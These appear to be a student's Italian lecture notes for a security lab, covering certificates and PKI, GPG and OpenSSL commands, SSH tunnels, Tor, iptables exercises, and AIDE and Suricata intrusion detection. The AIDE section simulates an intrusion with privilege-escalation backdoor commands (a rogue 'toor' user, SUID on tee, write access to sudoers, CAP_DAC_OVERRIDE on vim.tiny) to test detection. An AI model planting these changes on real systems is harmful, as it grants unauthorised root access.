+Un modo uteriore è l'utilizzo di certificati di chiavi pubbliche.
+Le chiavi vengono firmate la enti pubblici che attestano la veridicità della chiave.
+
+IL certificato è formato dall'ID dell'algoritmo di firma, periodo di validità, informazioni generali sulla chiave ...
+L'infrastruttura si chiama public key infrastructure
+
+Riassumendo il sistema di certificazione : 
+La registration authoruty interagisce con gli utenti che richiedono dei certificati, essi devono essere identificati con vari metodi ( documenti ufficiali, utenze ... ).
+La chiave viene generata all'interno di un contenitore ( ad esempio una smart card ) , non esiste un vero e proprio
+comando per estrarre la chiave privata.
+Un approccio uteriore può essere la sfida e risposta, ovvero un esempio di autenticazione attiva.
+
+SFIDA-RISPOSTA:
+Al momento dell'autenticazione di usa un segreto senza svelarlo.
+Si dimostra il possesso della chiave privata senza però svelarla.
+Un certificatore crea una sfida, la cifra con la chiave pubblica dell'utente.
+L'utente la decifra e risponde.
+
+I certificati hanno durata limitata nel tempo, possono essere quindi revocati anche prima della scadenza naturale.
+Al momento della revoca viene pubblicato il certificato su un directory server pubblico.
+Queste pubblicazioni vengono fatte ogni tot tempo dopo che si sono ricevute un po' di richieste, la CA è sempre
+tempestata di richieste.
+
+Certificate revocation list : liste scaricabili e consultabili online.
+
+
+Il certificato è quindi un dato digitale che attesta congruenza tra autenticità e chiave pubblica.
+I certificati si possono autofirmare, ad esempio quelli delle grandi autorita --> dal punto della fiducia non vale nulla.
+l'Autorità è sufficientemente autorevole per indurre il browser ad riconoscerlo come valido.
+Le root CA hanno certificati autofirmati.
+ 
+In fondo si arriva ad un root certificate già presente nei built in del browser.
+Al momento della connessione il server invia il certificato, il browser verifica la validità.
+
+Il browser dice al server di sfidarlo a dimosrtare che esso abbia effettivamente la sua chiave privata con il
+meccanismo di autenticazione richiesta risposta.
+
+GPG
+Introduciamo ora uno strumento utile per la crittografia : GPG --> tool a linea di comando
+Permette di svolgere operazioni tipo cifrare e autenticare file.
+
+1. Generiamo una coppia di chiavi
+gpg --generate-key
+
+La chiave viene poi cifrata per essere protetta attraverso una passfrase
+--> pass quack
+
+È stato creato un portachiavi in una cartella /home/kali/.gnupg/openpgp-revocs.d
+Sono state create 2 chiavi
+
+pub   rsa3072 2024-04-24 [SC] [expires: 2026-04-24]
+      410A0790A52ED49DBEEAE498419A9C52E285BB8D
+--> SC serve per le signature, serve per dare in giro le firme
+
+Poi sono state generate una coppia di sottochiavi
+sub   rsa3072 2024-04-24 [E] [expires: 2026-04-24]
+--> E : encryption -->Usare la stessa chiavi per cifrare e decifrare è male, quindi questa è la chiave di cifrazione
+
+Dove sono le chiavi?
+─$ ls -l .gnupg     
+total 20
+drwx------ 2 kali kali 4096 Apr 24 07:03 openpgp-revocs.d
+drwx------ 2 kali kali 4096 Apr 24 07:03 private-keys-v1.d
+-rw-r--r-- 1 kali kali 1983 Apr 24 07:03 pubring.kbx
+-rw------- 1 kali kali   32 Apr 24 07:00 pubring.kbx~
+-rw------- 1 kali kali 1240 Apr 24 07:03 trustdb.gpg
+   
+Possiamo importare le chiavi ed esportarle.
+è fondamentale esportare quella pubblica. --> gpg --output public.pgp --armor --export albocatte02@gmail.com 
+
+l'esportaazione della chiave privata ha senso solo in caso se ne voglia fare un backup magari cifrandolo
+con una passfrase
+gpg --output backupkeys.pgp --armor --export-secret-keys --export-options export-backup albocatte02@gmail.com
+
+Dopo aver esportato la chiave pubblica occorre distribuirla in giro.
+Un modo è quello di pubblicarlo su un server di pubblico accesso.
+Anche se non è a prova di bomba 
+
+Occorre identificare la chiave --> gpg --keyid-format LONG --list-keys albocatte02@gmail.com
+pub   rsa3072/419A9C52E285BB8D  --> l'id della chiave è 419A9C52E285BB8D
+Carichiamo la chiave su un server
+gpg --keyserver pgp.mit.edu –send-keys 419A9C52E285BB8D
+
+Cifriamo un file
+gpg --encrypt --armor -r identita@mail file_da_crittare
+
+UN esempio di cifratura : gpg -c wazuh-install-files.tar    
+Per decifrare : gpg -d wazuh-install-files.tar    
+
+Per cifrare e firmare un file :
+gpg --encrypt --armor --sign -r identita@mail file_da_crittare
+Leggere le man page per vedere l'opzione che permette di specificare con quale chiave firmare
+
+Per firmare la chiave pubblica di qualcuno
+gpg --sign-key identita@mail
+
+
+OPENSSL
+È una libreria che implementa vari algoritmi e protocolli.
+
+Cifriamo un file in un binario
+touch file_base64.txt
+echo “Test base64” > file_base64.txt
+openssl enc -base64 -in file_base64.txt
+Il risultato della cifratura contiene in fondo 2 == che servono come padding
+
+
+Generiamo una chiave rsa con openssl
+openssl genrsa -out chiave.pem 2048
+
+Guardiamo la chiave generata ( contiene sia la chiave pubblica che quella privata ) 
+openssl rsa -in chiave.pem -text | less
+SOno stati generati p e q per calcolare il modulo e con un numero e prefissato si è calcolato il numero d.
+
+Il file chiave.pem non è protetta ( gpg chiede subito una passfrase ) 
+openssl rsa -in chiave.pem -aes-256-cbc -out enc_chiave.pem
+Viene chiesta una passfrase di protezione
+Alla fine viene creato un file enc_chiave.pem
+
+Volendo possiamo ora cancellare la chiave
+rm chiave.pem è discutibile --> chiave.pem è un link ad un i-node. Il quale ha puntatore al data-block.
+Su una macchina poco trafficata i blocchi hanno alta probabilità di essere sovrascritti, ma non siamo sicuri.
+Prima di tutto dobbiamo sovrascivere tutto in modo sicuro e poi cancellare tutto in modo sicuro tramite ad esempio took di wiping ( sono è così possibile reperire i dati studiando la magnetizzazione dei blocchi ) 
+
+IN caso a
+dd if=/dev/zero of=chiave.pem bs=1 count=1704 --> 1704 è la lunghezza del file
+hexdump -C chiave.pem --> ci sono solo zeri
+rm chiave.pem
+
+Estraiamo la chiave pubblica in un file pub_chiave.pem
+openssl rsa -in enc_chiave.pem -pubout -out pub_chiave.pem
+Per estrarla è necessario inserire la passfrase
+
+Possiamo fare le analoghe operazione di cifratura di file,firma.
+
+Simuliamo una PKI
+Osseriviamo il file /etc/ssl/openssl.cnf
+
+####################################################################
+[ ca ]
+default_ca      = CA_default            # The default ca section
+
+####################################################################
+-->Possiamo selezionare quale certificato utilizzare
+
+Le policy indicano cosa serve per compilare un certificato, cosa è opzionale e cosa non serve
+
+Occorre generare un certificato per la pki
+openssl genrsa -out rootCA.key 2048
+
+In italia per fare i certificatori occorre avere una grande solitità finanziaria.
+Il certificato legale generato e memorizzato in un certo modo ha validità legale e non è ripudiabile.
+
+openssl req -x509 -new -key rootCA.key -days 3650 -out rootCA.pem
+--> generiamo direttamente un certificato dato che alla fine ce lo firmiamo da soli
+Abbiamo generato il file rootCA.pem
+
+Abbiamo creato un certificato con issuer e subject identici, non a caso lo abbiamo creato e convalidato noi stessi
+
+openssl genrsa -out client1.key 2048
+openssl req -new -key client1.key -out client1.csr
+richiesta di certificazione della chiave pubblica generata dal comando precedente
+
+client1.csr --> richiesta di firma di certificato
+
+ openssl req -in client1.csr -text | less  --> per vedere il contenuto
+ 
+La richiesta viene autofirmata con la chiave stessa così il certificatore veerifica tra la chiave pubblica dentro al certificato e la firma che è sempre dentro al certificato.
+
+Il file csr andrebbe caricato su siti di certificatori
+
+Per essere una CA a questo punto firmiamo il certificato
+openssl x509 -req -days 365 \
+-CA rootCA.pem -CAkey rootCA.key \
+-CAcreateserial -CAserial serial \
+-copy_extensions copy \
+-in client1.csr -out client1.pem
+
+è stato generato un file serial
+openssl x509 -in client1.pem -text | less --> per vedere tutto quello che abbiamo generato
+
+
+-------------------------------------LEZIONE 8/05/2024-----------------------------------
+
+Una VPN è trasparente alle applicazioni e trasforta il traffico tra una rete all'altra con tutte le protezioni del caso.
+Nel nostro caso apriremo dei tunnel su porte specifiche.
+
+TUNNEL SSH
+Diventiamo root su kali con sudo .i
+
+Kali:192.168.56.5 (eth1)
+Host : è presente un'interfaccia vboxnet0 (eth2)
+
+ping 192.168.56.5 sulla macchina host, riesce a pingare la VM
+
+Configuriamo un server web locale
+cd /etc/nginx/sites-enabled
+Modifichiamo le prime rigahe
+server {
+        listen 127.0.0.1:80 default_server;
+        listen [::]:80 default_server;
+
+systemctl restart nginx
+ss -lntp | grep 80 --> sulla macchina virtuale è presente un processo in ascolto sulla macchina
+
+sul browser kali http://127.0.0.1 visualizziamo una pagina
+Facendo la stessa cosa sul browser dell'host non si riesce ad accedere
+Il server ha fatto il bind su una specifico indirizzo.
+
+
+Abilitiamo ssh
+systemctl start ssh
+ss -lntp | grep ssh
+
+ssh kali@192.168.56.5
+
+ssh ha contattato kali, il demone ha spedito la public key, il client la riceve ma non sa se sia o meno autentica. 
+Nel web tutto viene risolto con i certificati
+In ssh i certificati non si usano a differenza del web, deve essere l'utente ad accettarla.
+
+A questo punto la chiave è stata registrata dentro alla dir .ssh/known-hosts che contengono
+tutte le chiavi degli host ai quali ci si è collegati via ssh
+
+Se al comando ssh aggiungiamo il parametro -v notiamo che ad un certo punto la chiave
+viene trovata nel file known-hosts, da questo punto parte una sfida risposta per verificare che
+il server possieda la chiave privata.
+Il server ora chiede al client di autenticarsi.
+
+Proviamo ad incanalare il traffico all'interno di ssh per autenticarsi e proteggere il traffico.
+
+ssh -L 8000:127.0.0.1:80 kali@192.168.56.5
+Ora sulla macchina host vediamo la pagina 127.0.0.1:8000
+
+In questo modo ssh funge da security gateway
+Cioò che abbiamo appena fatto è il local port forwarding.
+Lanciando ssh sulla macchina locale, il processo ssh si associa alla porta 8000 e crea un tunnel cifrato verso il server.
+Tutto il traffico sulla porta locale 8000 viene spedito al server.
+
+Remote port
+SI collega alla macchina host ad un host remoto sul quale si apre una porta in listen, chiunque 
+si collega alla porta 8000 del remote verrà ridiretto sulla macchina host sulla porta 80.
+
+Sul terminale di kali
+ssh -R 8000:127.0.0.1:80 s0001020328@192.168.56.1
+Il client ssh si collega ad un server ssh in asoltao sulla porta 80000.
+Tutto ciò che arriva sulla porta 8000 del remote viene recapitato alla macchina kali sulla porta 80.
+
+
+
+Un protocollo utilizzato per l'accesso ai servizi è SOCKS.Utilizzato per il controllo degli accessi.
+è un meccanismo per il filtraggio del traffico che si interpone tra client e server per decidere cosa 
+far passare. Genera controlli del traffico da dentro verso fuori.
+
+ssh -D attiva un proxy SOCKS dinamincamente
+
+ssh -D 8080 sec@192.168.56.x
+sUlla macchina locale tutto ciò che riceve su 8080 che rispetta il protocollo SOCKS viene preso,
+spedito al server remoto e fatto uscire come se fosse originato da quest'ultimo ( simile ai server VPN )
+
+
+TOR ( non prevede autenticazione, cifra il traffico )
+Viene acceduto mediante un proxy SOCKS.
+Solitamente si usa in browser fatto apposta.
+SI lancia un demone locale che si comporta come un proxy SOCKS che si collega all'endpoint locale.
+
+Router a cipolla : è un sistema che implementa il concetto di overlay network.
+ALcuni nodi TOR, tra un nodo e l'altro c'è un normale routing IP, ma quando vogliamo stabilire una connessione autenticata e certificata, la connessione a livello applicativo è una rete sovrapposta
+caratterizzata da link cifrati.
+Ogni nodo TOR dal punto di vista applicativo è sovrapposta al livello network ( la rete applicativa nota 3 hop quando magari in realtà i salti fisici sono 100 ).
+
+Occorre scaricarsi delle entry node, si stabilisce una connessione cifrata tra client e entry node.
+L'entry node sceglie un rely node ( nodo di rilancio ), con il quale concorderà una chiave di cifratura.
+
+Il protocollo di scambio di chiavi non permette di sapere il relay node da parte del client.
+Ogni volta che vogliamo fare una richiesta:
+cifriamo la richiesta con le varie chiavi dei vari nodi.
+Solo l'entry node sa l'ip del client e il relay node da contattare.
+Il relay non conosce l'ip del client e il nome che si vuole visitare 
+L'exit node conosce la destinazione che si vuole visitare.
+
+Tor ha introdotto un layer dei bridge ( approfondimento ) con cui si rende meno chiaro l'utilizzo di TOR.
+
+TOR può anche incapsulare le richieste DNS, il problema che le query viaggiano il chiaro anche se non possono essere lette le richieste HTTP.
+
+Meglio utilizzare HTTPS per formare 4 strati di sicurezza, 3 vengono rimossi da TOR,
+l'utimo rimarrà così che solo il client possa leggere i dati.
+
+
+
+
+----------------------------------------LEZIONE 15/05/2024 --------------------------------
+IPTABLES è un packet filter di pacchetti ed è in grado di monitorare gli headers dei vari pacchetti.
+
+
+Il framework net filter ha delle catene ( sequenze di regole ) che ci dicono quando vengono eseguite diverse operazione.
+Ciascuna catena ha varie tabellae che dicono che operazioni vengono eseguite.
+
+
+Filter forward : un oggetto che su un router blocca o meno il traffico in transito.
+Catena output : implementa la seconda metà del personal firewall che blocca i pacchetti che cercano di uscire dalla macchina che non sono autorizzati.
+
+STRUTTURA DELLE REGOLE
+Composte da 2 parti : sono espressioni if / then 
+match ( insieme di condizioni ) --> if 
+target ( insieme di azioni )  --> then
+
+
+TARGET DI BASE
+ACCEPT --> termina l'analisi all'interno della singola catena ,il pacchetto viene accettato e passa al prossimo step.
+DROP --> termina la scansione della catena corrente e scarta il pacchetto
+PREROUTING
+OUTPUT
+RETURN
+POSTROUTING
+INPUT
+LOG --> scrive in un diario i dettagli che hanno fatto match con quella regolal
+
+è possibile anche non specificare nessun target ad una regola, questa regola viene utilizzata a scopo di monitoraggio.
+
+ES : regola che intercetta tutti i pacchetti su una porta. Quando i pacchetti beccano quella regola incrementano un contatore.
+
+
+Scaricare il file ed eseguirlo nella cartella /large
+Su tutte le macchine diventiamo root
+
+
+root@r2:~# tcpdump -i any -nlp icmp
+se non si mettono filtri ( icmp ), tcpdump parte all'infinito perchè siamo collegati alla macchina via ssh.
+Ogni riga ssh è un comando che a sua volta è un pacchetto da stampare
+
+root@client:~# ping 10.2.2.1
+
+Vediamo r2 :
+10:57:43.492734 eth2  In  IP 10.1.1.1 > 10.2.2.1: ICMP echo request, id 34091, seq 1, length 64
+10:57:43.493507 eth1  Out IP 10.1.1.1 > 10.2.2.1: ICMP echo request, id 34091, seq 1, length 64
+10:57:43.493917 eth1  In  IP 10.2.2.1 > 10.1.1.1: ICMP echo reply, id 34091, seq 1, length 64
+10:57:43.493929 eth2  Out IP 10.2.2.1 > 10.1.1.1: ICMP echo reply, id 34091, seq 1, length 64
+10:57:44.493636 eth2  In  IP 10.1.1.1 > 10.2.2.1: ICMP echo request, id 34091, seq 2, length 64
+10:57:44.493652 eth1  Out IP 10.1.1.1 > 10.2.2.1: ICMP echo request, id 34091, seq 2, length 64
+10:57:44.494460 eth1  In  IP 10.2.2.1 > 10.1.1.1: ICMP echo reply, id 34091, seq 2, length 64
+
+I pacchetti sono accomuanti avendo seq 1 ( fanno parte dello stesso ping ) 
+
+
+Provando a pingare i vari router....
+root@client:~# ping -c 1 10.9.9.2  --> non funziona
+facendo ip r troviamo che non è presente alcun riferimento a 10.9.9.2.
+
+S1 non è in grado di raggiungere S2, un domani le 2 macchine potrebbero comunicare.
+Se vogliamo impedire che le 2 macchine si vedano dobbiamo includere una regola di filtraggio e non contare sul routing.
+
+
+I router sono raggiungibili dal client
+root@client:~# ssh vagrant@10.1.1.254
+
+Il router dal punto di vista di client e server deve essere opaco, non deve essere possibile a client o server di connettersi
+via ssh ai router per apportare modifica.
+Occorre attenzione a non chiudersi fuori
+
+vagrant@client:~$ echo $SSH_CONNECTION
+10.0.2.2 54338 10.0.2.15 22
+10.0.2.2 54338 Tutto ciò che arriva da questa connessione deve essere concesso, il resto va disattivato.
+
+Concentriamoci sulla tabella filter su cui ci sono 3 catene diverse
+INPUT
+OUTPUT
+FORWARD
+
+Per consentire l'accesso ssh occorre usare la catena di INPUT 
+root@r1:~# iptables -A INPUT -s 10.0.2.2 -d  10.0.2.15 -i eth0 -p tcp --dport 22 -j ACCEPT
+
+iptables -A INPUT -s 10.0.2.2 -d  10.0.2.15 -i eth0 -p tcp --dport 22 --> match
+-j ACCEPT --> target
+
+
+Per verificare che tutto sia andato bene : 
+iptables -vnL INPUT
+
+
+Tutte le volte che filtriamo il traffico occorre ricordare che il traffico è bidirezionale
+root@r1:~# iptables -A OUTPUT -d 10.0.2.2 -s  10.0.2.15 -o eth0 -p tcp --sport 22 -j ACCEPT
+
+root@r1:~# iptables -P INPUT DROP
+root@r1:~# iptables -P OUTPUT DROP
+root@r1:~# iptables -vnL | cut -c-40
+Chain INPUT (policy DROP 0 packets, 0 by
+ pkts bytes target     prot opt in     o
+  588 33672 ACCEPT     6    --  eth0   *
+
+Chain FORWARD (policy ACCEPT 0 packets, 
+ pkts bytes target     prot opt in     o
+
+Chain OUTPUT (policy DROP 0 packets, 0 b
+ pkts bytes target     prot opt in     o
+  126  9744 ACCEPT     6    --  *      e
+
+
+Adesso andando sul client notiamo che il comando ssh 10.1.1.254 non funziona proprio, questo perchè il pacchetto è stato
+direttamente scartato senza invare una risposta.
+Abbiamo bloccato l'accesso ad un servizio locale.
+
+
+Vediamo ora di bloccare il traffico remoto.
+DObbiamo ragionare sul traffico, da chi proviene, la destinazione e le varie catene coinvolte.
+
+COnfiguriamo su R1 il firewall in modo da consentire il traffico solo tra le reti dei client e server.
+
+Dal punto di vista di R1 questo è traffico remoto non destinato alla macchina locale.
+Utilizziamo FORWARD per definire regole di inoltro.
+
+root@r1:~# iptables -A FORWARD -i eth1 -o eth2 -s 10.1.1.0/24 -d 10.2.2.0/24 -j ACCEPT 
+root@r1:~# iptables -A FORWARD -i eth1 -o eth2 -s 10.1.1.0/24 -d 10.3.3.0/24 -j ACCEPT
+
+Inseriamo tutte le regole di ritorno
+root@r1:~# iptables -A FORWARD -o eth1 -i eth2 -d 10.1.1.0/24 -s 10.3.3.0/24 -j ACCEPT 
+root@r1:~# iptables -A FORWARD -o eth1 -i eth2 -d 10.1.1.0/24 -s 10.2.2.0/24 -j ACCEPT 
+
+
+root@r1:~# iptables -vnL FORWARD 
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+    0     0 ACCEPT     0    --  eth1   eth2    10.1.1.0/24          10.2.2.0/24         
+    0     0 ACCEPT     0    --  eth1   eth2    10.1.1.0/24          10.3.3.0/24         
+    0     0 ACCEPT     0    --  eth2   eth1    10.3.3.0/24          10.1.1.0/24         
+    0     0 ACCEPT     0    --  eth2   eth1    10.2.2.0/24          10.1.1.0/24         
+
+root@r1:~# iptables -P FORWARD DROP
+
+Supponiamo che i client non possano pingare S2
+
+1. Prendiamo le regole e mettiamo -D invece che -A
+root@r1:~#  iptables -D FORWARD -i eth1 -o eth2 -s 10.1.1.0/24 -d 10.2.2.0/24 -j ACCEPT 
+
+2. root@r1:~# iptables -vnL FORWARD --line-numbers  --> le regole sono numerate
+
+root@r1:~# iptables -D FORWARD 3
+
+root@r1:~# iptables -F FORWARD --> flush di tutte le regole FORWARD
+
+Se utilizziamo un file di testo con delle regoe
+iptables -A FORWARD -s 10.1.1.0/24 -d 10.2.2.0/24 -j ACCEPT
+iptables -A FORWARD -s 10.2.2.0/24 -d 10.1.1.0/24 -j ACCEPT
+iptables -A FORWARD -s 10.1.1.0/24 -d 10.3.3.0/24 -j ACCEPT
+iptables -A FORWARD -s 10.3.3.0/24 -d 10.1.1.0/24 -j ACCEPT
+iptables -P FORWARD DROP
+
+bash ./nomefile e riotteniamo tutte le regole in ordine.
+con -i si inseriscono le regole in append.
+
+
+
+ES : Configurare il firewall su S1 per accettare connessioni SSH da tutte le VM della rete dei client ECCETTO 10.1.1.1 ( client ) 
+configurare la "salvaguardia" per poter accedere via vagrant, bloccare qualsiasi altro accesso via SSH.
+Per semplicità non bloccare l'OUTPUT ma lavorare solo sull'INPUT.
+
+iptables -P INPUT ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -F INPUT
+iptables -A INPUT -s 10.1.1.1 -d 10.2.2.1 -i eth1 -p tcp --dport 22 -j DROP
+iptables -A INPUT -s 10.1.1.0/24 -d 10.2.2.1 -i eth1 -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -s 10.0.2.2 -d 10.0.2.15 -i eth0 -p tcp --dport 22 -j ACCEPT
+iptables -P INPUT DROP
+
+
+
+ES : L'unico traffico abilitato deve essere ssh dal client a S2. Questa regola deve essere fatta rispettare in qualunque macchina della catena
+Occorre configurare il packet filter di 4 macchine diverse
+
+##CLIENT --> occorre consentire al client di collegarsi al server, chi devo coinvolgere ? 
+iptables -A OUTPUT -s 10.1.1.1 -d 10.3.3.1 -o eth1 -p tcp --dport 22 -j ACCEPT --> richiesta al server
+iptables -A INPUT -d 10.1.1.1 -s 10.3.3.1 -i eth1 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT --> risposta del server
+
+L'attaccante genera un pacchetto che ha come SOURCE 10.3.3.1 su eth1 sulla porta 22
+Il firewall deve essere stateful per ricordarsi 
+
+Il client liberamente produce in output il primo pacchetto ma accetta in output solo le vere risposte ovvero quelle con connessioni
+già stabilite
+
+## SERVER S2
+iptables -A INPUT -s 10.1.1.1 -d 10.3.3.1 -i eth1 -p tcp --dport 22 -j ACCEPT --> richiesta del client senza preavviso
+iptables -A OUTPUT -d 10.1.1.1 -s 10.3.3.1 -i eth1 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT --> risposta del server su una precedente richiesta del client
+
+
+##ROUTER R1
+iptables -A FORWARD -s 10.1.1.1 -d 10.3.3.1 -i eth1 -o eth2  -p tcp --dport 22 -j ACCEPT 
+iptables -A FORWARD -d 10.1.1.1 -s 10.3.3.1 -i eth2 -o eth1 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 
+
+##ROUTER R2
+iptables -A FORWARD -s 10.1.1.1 -d 10.3.3.1 -i eth2 -o eth3  -p tcp --dport 22 -j ACCEPT 
+iptables -A FORWARD -d 10.1.1.1 -s 10.3.3.1 -i eth3 -o eth2 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 
+
+
+Es : R1 fa finta di accettare connessioni SSH da CLient ridirigendole su S1
+iptables -t nat -I PREROUTING -p tcp -s 10.1.1.1 -d 10.1.1.254 --dport 22 -j DNAT --to-destination 10.2.2.1
+
+Nel prerouting, tutti i pacchetti TCP destinati al router li si cambia l'indirizzo e li si spedisce su un certo endpoint.
+Il NAT viene prima quindi la regola che blocca pacchetti SSH non viene presa in considerazione.
+Il NAT pensa lui stesso al ritorno, quindi non è necessario inserire INPUT e OUTPUT , automaticamente il router se ne occupa.
+
+root@r1:~# iptables -t nat -I PREROUTING -p tcp -s 10.1.1.1 -d 10.1.1.254 --dport 22 -j DNAT --to-destination 10.2.2.1
+root@r1:~# tcpduml -vnl -i any host 10.1.1.1
+
+vagrant@client:~$ ssh 10.1.1.254
+
+
+
+
+--------------------------------------LEZIONE 22/05/2024-----------------------------
+
+HOST INTRUSION DETECTION : siamo interessati ai seguenti aspetti
+-Analisi log
+-Analisi integrità file system
+
+AIDE : strumento di rilevazione delle intrusioni per mezzo di modifiche fatte al fs.
+
+ES: la privilege escalation può essere fatta alterando il file sudoers, alterare bit speciali.
+Il comando find permette di trovare file con il SUID bit settato, ma ci sono info più nascoste.
+
+Tutto può essere fatto da AIDE, già preinstallato sulla macchina kali.
+Possiamo vederne info con aide -v.
+Aide raccoglie insieme molte funzionalità che richiederebbe l'esecuzione manuale sulla linea di comando da
+parte dell'amministratore.
+Quindi tutti i controlli che aide da si possono eseguire a mano senza problemi.
+
+Il file di configurazione generale per AIDE si trova in:
+– /etc/default/aide.
+Le regole e le configurazioni risiedono in:
+– /etc/aide/
+Il database AIDE si trova in:
+– /var/lib/aide 
+I DB vengono utilizzati per confrontare le successive modifiche. La directory è protetta la lettura e scrittura.
+Solo l'utente _aide può entrare in questa cartella. 
+
+
+$ sudo ls -ld /var/lib/aide
+drwx------ 2 _aide root 4096 May 15 07:53 /var/lib/aide
+
+Un problema comune : occorre essere consapevole dei permessi che questa risorsa richiede. Bisogna essere
+sudo per utilizzare questo file.
+
+/etc/default/aide
+# Main configuration file
+CONFIG="/etc/aide/aide.conf" --> file di configurazione
+#CRON_DAILY_RUN=yes --> è possibile avviare un servizio così che i controlli siano fatti a vari intervalli
+
+
+/etc/aide/aide.conf --> specifica le regole che devono essere applicate
+
+Anche i log devono essere protetti. Solitamente crescono, poi vengono compressi e si inizia con un nuovo log.
+Aide ha i meccanismi per capire che il file è stato "cambiato" in modo corretto e non si tratta di violazione.
+
+
+CONFIGURAZIONE AIDE
+Prima di procedere con la configurazione specifica su AIDE è necessario prima di tutto creare un nuovo
+database AIDE
+
+Nel file di configurazione non sono incluse regole di monitoraggio. Tutti i file moderni sono modularizzati
+@@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
+CHe include tutti gli strumenti di monitoraggio
+
+Avere sistemi flessibili è bello in cui la configurazione è astratta su vari livelli.
+Per il sicurista è un incubo... Troppa roba, la sicurezza ama la semplicità.
+
+Se lanciassimo aideinit il sistema lancerebbe tutte le righe di configurazione di tutti i file,
+facciamo quindi una configurazione.
+
+┌──(kali㉿kali)-[/etc/aide]
+└─$ sudo nano aide.conf   
+COmmentare l'ultima riga e aggiungere
+/etc f R
+
+$ sudo aideinit    
+
+sudo ls -l /var/lib/aide 
+total 144
+-rw------- 1 root  root  72808 May 22 06:59 aide.db
+-rw------- 1 _aide _aide 72808 May 22 06:59 aide.db.new
+
+
+
+SImuliamo un intrusione
+┌──(kali㉿kali)-[~]
+└─$ sudo useradd toor
+[sudo] password for kali: 
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ sudo passwd toor 
+New password: 
+Retype new password: 
+passwd: password updated successfully
+
+
+
+sudo aide -c /etc/aide/aide.conf -C --> vediamo se aide ha rilevato modifiche
+Start timestamp: 2024-05-22 07:02:39 -0400 (AIDE 0.18.6)
+AIDE found differences between database and filesystem!!
+
+
+Changed entries:
+---------------------------------------------------
+
+f > ... mci.H.. . : /etc/group --> dimensione cresciuta, cambiati i metadati ed è cambiato l'hash.
+I punti indicano che una caratteristica non è cambiata
+...
+...
+
+File: /etc/passwd
+ Size      : 3595                             | 3632
+ Mtime     : 2024-03-06 08:49:44 -0500        | 2024-05-22 07:01:12 -0400
+ Ctime     : 2024-03-06 08:49:44 -0500        | 2024-05-22 07:01:12 -0400
+ Inode     : 526236                           | 526249
+ MD5       : ygGUONYVxZgm3x/Ddsv16A==         | P2jKjtapfllRuW+/1QmfcQ==
+
+
+Per trovare le modifiche di un file singolo
+sudo diff /etc/passwd /etc/passwd- 
+65d64
+< toor:x:1003:1003::/home/toor:/bin/sh
+
+
+Inizializzare il db con le regole impostate per ciò che interessa.
+Dato un malware che viola l'integrità del sistema occorre trovare le modifiche apportate.
+Si scatta un foto PRIMA DI LANCIARE IL MALWARE
+Si avvia il malware
+Si vede cosa è cambiato tramite aide e tramite il comando diff.
+
+
+Un altro esempio
+sudo chmod +s /usr/bin/tee
+Abbiamo dato il suid a tee.
+Tee può andare a scrivere un file che è scrivibile come root
+Aide si accorge della modifica? NO perchè la directory non è inclusa nelle regole di configurazione
+lanciando aideinit si dichiara valida l'attuale configurazione del sistema e i check di aide non la 
+rileveranno più.
+
+
+
+
+setfacl -m u:toor:rw /etc/sudoers  --> tramite acl all'utente toor aggiungi read e write
+
+
+Misconfiguration alle capabilities
+sudo /usr/sbin/setcap "CAP_DAC_OVERRIDE=eip" /usr/bin/vim.tiny
+
+In questo caso AIDE non aiuta tanto a capire cosa effettivamente è stato modificato, dice solo che è stata
+rilevata una modifica al file /usr/bin/vim.tiny dicendo che le capabilities sono passata da AAQA a AQAOCBWOIBCIWBOIW... non molto utile
+
+getcap /usr/bin/vim.tiny per visualizzare modifiche effettive
+
+Wazuh NON CAPITERÀ ALL'ESAME 
+
+SURICATA
+Si occupa di analizzare traffico in tempo reale sia in modalità AID che IDS.
+Può anche lavorare offline.
+è possibile analizzare traffico alla ricerca di attacchi noti.
+In termini d'esame si dovrò analizzare un file pk per rilevare traccie di attacchi.
+
+DROP --> non manda pacchetti indietro
+REJECT -->  avvisa dell'errore
+Suricata supporta 3 tipi differenti di reject.
+
+Il file di configurazione è /etc/suricata/suricata.yaml
+La cartella /etc/suricata/rules contiene varie regole
+
+Preleviamo la virtuale il file yaml di configurazione
+cp suricata.yaml /etc/suricata/
+touch /etc/suricata/rules/seclab.rules
+cat ping.rules >> /etc/suricata/rules/seclab.rules --> il primo file si trova su virtuale
+suricata -c /etc/suricata/suricata.yaml -i eth1 -vvv
+eth1 è l'interfaccia che permete alla VM di parlare con la macchina host
+
+ping 192.168.56.1
+Andiamo a vedere i file di log
+cd /var/log/suricata --> file di defualt dove fanno i log
+I messaggi si trovano in fast.log
+
+suricata -c /etc/suricata/suricata.yaml -i eth0 -vvv
+
+
+tcpdump -i eth0 -w pcap icmp
+
+
